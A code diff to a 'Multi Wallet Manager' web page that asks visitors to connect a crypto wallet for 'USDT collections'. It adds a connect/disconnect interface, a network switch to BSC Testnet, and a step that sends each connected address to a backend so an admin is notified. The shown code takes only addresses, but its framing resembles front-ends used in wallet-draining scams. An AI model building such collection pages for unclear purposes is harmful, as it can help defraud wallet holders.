@@ -75,6 +75,37 @@
       transform: none;
     }
 
+    .wallet-info {
+      background: rgba(255, 255, 255, 0.08);
+      border-radius: 15px;
+      padding: 20px;
+      margin: 20px 0;
+      text-align: left;
+    }
+
+    .info-row {
+      display: flex;
+      justify-content: space-between;
+      margin-bottom: 15px;
+      padding-bottom: 15px;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+    }
+
+    .info-row:last-child {
+      margin-bottom: 0;
+      padding-bottom: 0;
+      border-bottom: none;
+    }
+
+    .info-label {
+      color: #a0a0c0;
+    }
+
+    .info-value {
+      font-weight: 500;
+      word-break: break-all;
+    }
+
     .status {
       margin-top: 20px;
       padding: 15px;
@@ -130,9 +161,28 @@
     <h1>Multi Wallet Manager</h1>
     <p class="subtitle">Connect your wallet to manage USDT collections</p>
     
-    <button id="connect-wallet" class="btn">
-      <span id="connect-text">Connect Wallet</span>
-    </button>
+    <div id="connect-section">
+      <button id="connect-wallet" class="btn">
+        <span id="connect-text">Connect Wallet</span>
+      </button>
+    </div>
+    
+    <div id="wallet-section" class="hidden">
+      <div class="wallet-info">
+        <div class="info-row">
+          <span class="info-label">Wallet Address</span>
+          <span id="wallet-address" class="info-value"></span>
+        </div>
+        <div class="info-row">
+          <span class="info-label">Network</span>
+          <span id="network" class="info-value">BSC Testnet</span>
+        </div>
+      </div>
+      
+      <button id="disconnect-btn" class="btn">
+        Disconnect Wallet
+      </button>
+    </div>
     
     <div id="status-message" class="status hidden"></div>
   </div>
@@ -147,19 +197,48 @@
     }
 
     // DOM Elements
+    const connectSection = document.getElementById('connect-section')
+    const walletSection = document.getElementById('wallet-section')
     const connectWalletBtn = document.getElementById('connect-wallet')
     const connectText = document.getElementById('connect-text')
+    const disconnectBtn = document.getElementById('disconnect-btn')
+    const walletAddressEl = document.getElementById('wallet-address')
     const statusMessage = document.getElementById('status-message')
 
     // State
     let isConnecting = false
+    let isConnected = false
+    let currentWalletAddress = null
 
     // Initialize
     document.addEventListener('DOMContentLoaded', () => {
       connectWalletBtn.addEventListener('click', connectWallet)
+      disconnectBtn.addEventListener('click', disconnectWallet)
+      
+      // Check if wallet is already connected
+      checkExistingConnection()
     })
 
-    // Connect wallet function - ONE TIME ONLY
+    // Check for existing wallet connection
+    async function checkExistingConnection() {
+      if (window.ethereum) {
+        try {
+          // Check if accounts are already available
+          const accounts = await window.ethereum.request({ method: 'eth_accounts' })
+          if (accounts && accounts.length > 0) {
+            currentWalletAddress = accounts[0]
+            isConnected = true
+            showWalletSection()
+            updateWalletInfo()
+            showStatus('Wallet already connected')
+          }
+        } catch (error) {
+          console.log('No existing wallet connection')
+        }
+      }
+    }
+
+    // Connect wallet function
     async function connectWallet() {
       // Prevent multiple clicks
       if (isConnecting) {
@@ -177,21 +256,28 @@
           return
         }
         
-        // Request account access - this opens wallet UI
+        // Force account access request - this opens wallet UI
         console.log('Requesting account access...')
+        showStatus('Please confirm wallet connection in your wallet...')
+        
         const accounts = await window.ethereum.request({
           method: 'eth_requestAccounts'
         })
         
-        const walletAddress = accounts[0]
-        console.log('Wallet connected:', walletAddress)
+        currentWalletAddress = accounts[0]
+        isConnected = true
+        console.log('Wallet connected:', currentWalletAddress)
         showStatus('Wallet connected. Processing...')
         
         // Switch to correct network
         await switchToCorrectNetwork()
         
-        // Send to backend ONCE
-        const backendResult = await sendWalletToBackend(walletAddress)
+        // Update UI
+        showWalletSection()
+        updateWalletInfo()
+        
+        // Send to backend
+        const backendResult = await sendWalletToBackend(currentWalletAddress)
         
         if (backendResult.success) {
           showSuccess('Wallet connected successfully! Admin has been notified.')
@@ -215,6 +301,7 @@
         const currentChainId = await window.ethereum.request({ method: 'eth_chainId' })
         
         if (parseInt(currentChainId, 16).toString() !== CONFIG.CHAIN_ID) {
+          showStatus('Switching to BSC Testnet...')
           // Try to switch network
           try {
             await window.ethereum.request({
@@ -249,7 +336,20 @@
       }
     }
 
-    // Send wallet to backend - ONLY ONCE
+    // Update wallet information display
+    function updateWalletInfo() {
+      if (currentWalletAddress) {
+        walletAddressEl.textContent = formatAddress(currentWalletAddress)
+      }
+    }
+
+    // Format wallet address
+    function formatAddress(address) {
+      if (!address) return ''
+      return `${address.substring(0, 6)}...${address.substring(38)}`
+    }
+
+    // Send wallet to backend
     async function sendWalletToBackend(walletAddress) {
       try {
         console.log('Sending wallet to backend:', walletAddress)
@@ -280,6 +380,26 @@
         console.error('Backend connection error:', error)
         return { success: false, error: error.message }
       }
+    }
+
+    // Disconnect wallet
+    function disconnectWallet() {
+      isConnected = false
+      currentWalletAddress = null
+      showConnectSection()
+      showStatus('Wallet disconnected')
+    }
+
+    // Show connect section
+    function showConnectSection() {
+      connectSection.classList.remove('hidden')
+      walletSection.classList.add('hidden')
+    }
+
+    // Show wallet section
+    function showWalletSection() {
+      connectSection.classList.add('hidden')
+      walletSection.classList.remove('hidden')
     }
 
     // Show loading state
